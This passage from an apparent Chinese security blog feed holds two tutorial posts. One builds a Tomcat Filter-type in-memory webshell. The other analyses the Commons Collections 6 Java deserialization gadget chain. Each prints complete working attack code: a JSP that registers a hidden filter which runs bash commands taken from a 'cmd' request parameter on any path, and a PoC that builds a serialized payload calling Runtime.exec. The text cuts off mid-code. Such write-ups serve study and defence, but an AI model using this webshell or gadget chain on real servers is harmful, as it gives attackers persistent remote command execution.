class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><br>Field Configs = standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>Configs.setAccessible(<span class="hljs-keyword">true</span>);<br>Map filterConfigs = (Map) Configs.get(standardContext);<br><br><span class="hljs-keyword">if</span> (filterConfigs.get(name) == <span class="hljs-keyword">null</span>)&#123;<br>    Filter filter = <span class="hljs-keyword">new</span> Filter() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;<br>            HttpServletRequest req = (HttpServletRequest) servletRequest;<br>            <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-keyword">null</span>)&#123;<br>                <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>                Process process = <span class="hljs-keyword">new</span> ProcessBuilder(<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>                <span class="hljs-keyword">int</span> len = process.getInputStream().read(bytes);<br>                servletResponse.getWriter().write(<span class="hljs-keyword">new</span> String(bytes,<span class="hljs-number">0</span>,len));<br>                process.destroy();<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            filterChain.doFilter(servletRequest,servletResponse);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br><br>        &#125;<br><br>    &#125;;<br><br><br>    FilterDef filterDef = <span class="hljs-keyword">new</span> FilterDef();<br>    filterDef.setFilter(filter);<br>    filterDef.setFilterName(name);<br>    filterDef.setFilterClass(filter.getClass().getName());<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 将filterDef添加到filterDefs中</span><br><span class="hljs-comment">     */</span><br>    standardContext.addFilterDef(filterDef);<br><br>    FilterMap filterMap = <span class="hljs-keyword">new</span> FilterMap();<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setFilterName(name);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br><br>    standardContext.addFilterMapBefore(filterMap);<br><br>    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br><br>    filterConfigs.put(name,filterConfig);<br>    out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="3-完整代码"><a href="#3-完整代码" class="headerlink" title="3.完整代码"></a>3.完整代码</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span> %&gt;<br>&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br><br>&lt;%<br>    <span class="hljs-keyword">final</span> String name = <span class="hljs-string">&quot;reader-l&quot;</span>;<br>    ServletContext servletContext = request.getSession().getServletContext();<br><br>    Field appctx = servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-keyword">true</span>);<br>    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);<br><br>    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-keyword">true</span>);<br>    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);<br><br>    Field Configs = standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-keyword">true</span>);<br>    Map filterConfigs = (Map) Configs.get(standardContext);<br><br>    <span class="hljs-keyword">if</span> (filterConfigs.get(name) == <span class="hljs-keyword">null</span>)&#123;<br>        Filter filter = <span class="hljs-keyword">new</span> Filter() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;<br>                HttpServletRequest req = (HttpServletRequest) servletRequest;<br>                <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-keyword">null</span>)&#123;<br>                    <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>                    Process process = <span class="hljs-keyword">new</span> ProcessBuilder(<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>                    <span class="hljs-keyword">int</span> len = process.getInputStream().read(bytes);<br>                    servletResponse.getWriter().write(<span class="hljs-keyword">new</span> String(bytes,<span class="hljs-number">0</span>,len));<br>                    process.destroy();<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                filterChain.doFilter(servletRequest,servletResponse);<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br><br>            &#125;<br><br>        &#125;;<br><br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 创建一个FilterDef 然后设置我们filterDef的名字，和类名，以及类</span><br><span class="hljs-comment">         */</span><br>        FilterDef filterDef = <span class="hljs-keyword">new</span> FilterDef();<br>        filterDef.setFilter(filter);<br>        filterDef.setFilterName(name);<br>        filterDef.setFilterClass(filter.getClass().getName());<br><br>        <span class="hljs-comment">// 调用 addFilterDef 方法将 filterDef 添加到 filterDefs中</span><br>        standardContext.addFilterDef(filterDef);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 创建一个filtermap</span><br><span class="hljs-comment">         * 设置filter的名字和对应的urlpattern</span><br><span class="hljs-comment">         */</span><br>        FilterMap filterMap = <span class="hljs-keyword">new</span> FilterMap();<br>        filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>        filterMap.setFilterName(name);<br>            <span class="hljs-comment">// 这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</span><br>        filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 将filtermap 添加到 filterMaps 中的第一个位置</span><br><span class="hljs-comment">         */</span><br>        standardContext.addFilterMapBefore(filterMap);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 利用反射创建 FilterConfig，并且将 filterDef 和 standardCtx（即 Context）作为参数进行传入</span><br><span class="hljs-comment">         */</span><br>        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 将 name 和 filterConfig 作为 key-value进行传入</span><br><span class="hljs-comment">         */</span><br>        filterConfigs.put(name,filterConfig);<br>        out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>访问evil.jsp，显示注入成功：</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/12.png"></p><p>而后访问任何路径，并且传入参数<code>cmd</code>就可以：</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/13.png"></p><h3 id="4-Tomcat版本不同导致的坑点"><a href="#4-Tomcat版本不同导致的坑点" class="headerlink" title="4.Tomcat版本不同导致的坑点"></a>4.Tomcat版本不同导致的坑点</h3><p>这问题我搞了好久。。。。。</p><p>感谢这篇文章给的提示：<a href="https://www.kitsch.live/2021/04/17/webshell%E2%91%A1%E7%94%A8servlet%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8E%E5%86%85%E5%AD%98%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6webshell/">https://www.kitsch.live/2021/04/17/webshell%E2%91%A1%E7%94%A8servlet%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8E%E5%86%85%E5%AD%98%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6webshell/</a></p><p>坑：<br>tomcat 7 与 tomcat 8 在 FilterDef 和 FilterMap 这两个类所属的包名不一样<br>tomcat 7:</p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/14.png"></p><p>tomcat8：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.descriptor</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.FilterDef</span>;<br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.descriptor</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.FilterMap</span>;<br></code></pre></td></tr></table></figure><h1 id="4-内存马的排查"><a href="#4-内存马的排查" class="headerlink" title="4.内存马的排查"></a>4.内存马的排查</h1><p>这一点后面在写。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    在现在防护软件的越来越智能化以及开发人员、运维人员等IT行业人员的安全意识越来越高，传统的文件shell大多都气数</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java安全-CommonsCollections6利用链分析</title>
    <link href="https://reader-l.github.io/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>https://reader-l.github.io/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2021-04-27T11:47:20.000Z</published>
    <updated>2021-07-04T08:24:24.773Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    本篇文章我并不打算直接按照<code>ysoserial</code>中的代码进⾏讲解，原因是<code>ysoserial</code>的代码过于复杂了，我打算直接用P牛在代码审计星球里的《Java安全漫谈 - 12.反序列化篇(6)》里的代码来进行分析学习。</p><p>​    同时我们之前学习的<code>CommonsCollections1</code>利用链一直有高版本利用不了的问题，而<code>CommonsCollections6</code>利用链就显得比较通用，而且利用链也是基于<code>LazyMap#get()</code>的，也就是基于<code>CommonsCollections1</code>。克服高版本问题的方法，<strong>不过是在找是否还有其他调⽤ <code>LazyMap#get() </code>的地⽅。</strong></p><h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><h4 id="利用版本"><a href="#利用版本" class="headerlink" title="利用版本"></a>利用版本</h4><p>CommonsCollections 3.1 - 3.2.1</p><h4 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h4><p>JDK版本：暂无限制</p><h1 id="2-利用链"><a href="#2-利用链" class="headerlink" title="2.利用链"></a>2.利用链</h1><p>如下利用链是P牛的简化<code>POC</code>的利用链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> Gadget chain:</span><br><span class="hljs-comment"> java.io.ObjectInputStream.readObject()</span><br><span class="hljs-comment"> java.util.HashMap.readObject()</span><br><span class="hljs-comment"> java.util.HashMap.hash()</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() </span><br><span class="hljs-comment">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="hljs-comment">org.apache.commons.collections.map.LazyMap.get()</span><br><span class="hljs-comment">org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="hljs-comment">org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="hljs-comment"> java.lang.reflect.Method.invoke()</span><br><span class="hljs-comment"> java.lang.Runtime.exec()</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h1 id="3-利用链分析"><a href="#3-利用链分析" class="headerlink" title="3.利用链分析"></a>3.利用链分析</h1><p>我们在上面说过解决高版本问题的方法是在上下文中找到其它利用<code>LazyMap#get()</code>的地方。</p><p>​    我们找到的类就是<code>org.apache.commons.collections.keyvalue.TiedMapEntry </code>，在它的<code>getValue</code>方法中调用了<code>this.map.get</code>，而其<code>hashCode</code>方法调用了<code>getValue</code>。</p><p><img src="/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1.png"></p><p>​    因此，如果我们想要触发<code>LazyMap</code>利用链，就要找到哪里调用了</p><p><code>TiedMapEntry#hashCode</code>。</p><p>​    我们来看看<code>YSO</code>的作者的利用链比P牛的利用链多了两个步骤。在<code>ysoserial</code>中，是利⽤ <code>java.util.HashSet#readObject </code>到 <code>HashMap#put() </code>到 <code>HashMap#hash(key)</code>最后到 <code>TiedMapEntry#hashCode() </code>。</p><p><img src="/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/2.png"></p><p>​    而P牛发现，在 <code>java.util.HashMap#readObject </code>中就可以找到<code>HashMap#hash()</code>的调⽤，去掉了最前⾯的两次调⽤：</p><p>​    在<code>java.util.HashMap#readObject</code>可以发现调用了<code>hash()</code>方法。</p><p><img src="/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/3.png"></p><p>​    同时在<code>java.util.HashMap#hash()</code>发现了<code>key.hashCode</code>，只要我们让<code>key</code>为<code>TiedMapEntry</code>对象即可。</p><p><img src="/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/4.png"></p><h1 id="4-构造代码"><a href="#4-构造代码" class="headerlink" title="4.构造代码"></a>4.构造代码</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;deepin-calculator&quot;</span>&#125;),<br>        &#125;;<br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(innerMap, transformerChain);<br>        TiedMapEntry tme = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);<br>        Map expMap = <span class="hljs-keyword">new</span> HashMap();<br>        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br>        <span class="hljs-comment">// ⽣成序列化字符串</span><br>        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);<br>        oos.writeObject(expMap);<br>        oos.close();<br>        <span class="hljs-comment">// 本地测试触发</span><br>        System.out.println(barr);<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));<br>        Object o = (Object)ois.readObject();<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/6.png"></p><p>执行代码，弹了一个计算器，你以为成功，但是其实没有。。。</p><p>该计算器是在执行<code>put</code>方法的时候，触发的。并不是在反序列化的时候触发的。</p><p><img src="/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/5.png"></p><p>P牛对此的解决方法是<code>outerMap.remove(&quot;keykey&quot;);</code></p><p>成功在反序列化的时候也触发了命令执行。：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;deepin-calculator&quot;</span>&#125;),<br>        &#125;;<br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(innerMap, transformerChain);<br>        TiedMapEntry tme = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);<br>        Map expMap = <span class="hljs-keyword">new</span> HashMap();<br>        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br>        outerMap.remove(<span class="hljs-string">&quot;keykey&quot;</span>);<br>        <span 